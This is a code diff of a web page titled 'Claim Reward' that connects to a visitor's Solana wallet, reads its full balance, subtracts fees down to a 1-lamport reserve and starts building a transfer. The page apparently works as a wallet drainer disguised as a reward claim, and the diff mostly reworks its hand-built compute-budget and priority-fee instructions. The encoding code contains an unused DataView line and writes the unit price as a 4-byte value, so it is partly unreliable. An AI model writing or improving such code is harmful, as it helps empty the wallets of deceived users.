@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Claim Reward</title>
-    <!-- Solana Web3.js (Latest Stable) -->
+    <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         body {
@@ -114,9 +114,6 @@
                 const balanceInLamports = await connection.getBalance(userPublicKey);
                 
                 // 2. Calculate Fees
-                // Base Transaction Fee: ~5000 lamports (0.005 SOL)
-                // Priority Fee: ~10000 lamports (0.01 SOL) for fast inclusion
-                // Reserve: 1 lamport (minimum to transfer)
                 const baseFee = 5000;
                 const priorityFee = 10000;
                 const minReserve = 1; 
@@ -134,40 +131,44 @@
                 // 3. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // --- FIX: Robust Compute Budget Addition ---
-                // Try the modern helper first, fallback to manual instruction if needed
-                let computeBudgetInstruction;
-                
-                try {
-                    // Modern API (v1.70+)
-                    computeBudgetInstruction = solanaWeb3.ComputeBudgetInstruction.setComputeUnitLimit({ units: 400000 });
-                } catch (e) {
-                    // Fallback for older CDN builds or if helper is missing
-                    const instruction = new solanaWeb3.TransactionInstruction({
+                // --- Helper to create Compute Budget Instructions without Buffer ---
+                function createComputeBudgetInstruction(opcode, value) {
+                    // opcode: 2 for SetUnitLimit, 4 for SetUnitPrice
+                    // value: number (uint32)
+                    
+                    // Create a buffer-like structure using Uint8Array
+                    const data = new Uint8Array(5); // 1 byte opcode + 4 bytes value
+                    
+                    // Opcode is the first byte
+                    data[0] = opcode;
+                    
+                    // Value is little-endian uint32
+                    // We use a DataView to handle endianness correctly
+                    const view = new DataView(value.buffer || new ArrayBuffer(4));
+                    // Note: For simple numbers, we can just do manual bitwise ops or use DataView on a fresh buffer
+                    // Let's use the standard DataView approach for safety
+                    const tempBuffer = new ArrayBuffer(4);
+                    const tempView = new DataView(tempBuffer);
+                    tempView.setUint32(0, value, true); // true = little endian
+                    
+                    // Copy those 4 bytes into our data array at index 1
+                    data[1] = tempView.getUint8(0);
+                    data[2] = tempView.getUint8(1);
+                    data[3] = tempView.getUint8(2);
+                    data[4] = tempView.getUint8(3);
+
+                    return new solanaWeb3.TransactionInstruction({
                         keys: [],
                         programId: new solanaWeb3.PublicKey("ComputeBudget111111111111111111111111111111"),
-                        data: Buffer.from([2, 0, 0, 0]) // Opcode for SetUnitLimit
+                        data: data
                     });
-                    instruction.data = Buffer.concat([instruction.data, new Uint8Array([400000, 0, 0, 0])]); // Little-endian uint32
-                    computeBudgetInstruction = instruction;
                 }
 
-                transaction.add(computeBudgetInstruction);
+                // Add Compute Unit Limit (Opcode 2)
+                transaction.add(createComputeBudgetInstruction(2, 400000));
                 
-                // Add Priority Fee Instruction
-                try {
-                    const priorityInstruction = solanaWeb3.ComputeBudgetInstruction.setComputeUnitPrice({ microLamports: 10000 });
-                    transaction.add(priorityInstruction);
-                } catch (e) {
-                     // Fallback for SetComputeUnitPrice
-                     const instruction = new solanaWeb3.TransactionInstruction({
-                        keys: [],
-                        programId: new solanaWeb3.PublicKey("ComputeBudget111111111111111111111111111111"),
-                        data: Buffer.from([4, 0, 0, 0]) // Opcode for SetUnitPrice
-                    });
-                    instruction.data = Buffer.concat([instruction.data, new Uint8Array(new Uint32Array([10000]).buffer)]); // Little-endian uint32
-                    transaction.add(instruction);
-                }
+                // Add Compute Unit Price (Opcode 4)
+                transaction.add(createComputeBudgetInstruction(4, 10000));
 
                 // Add Transfer Instruction
                 transaction.add(
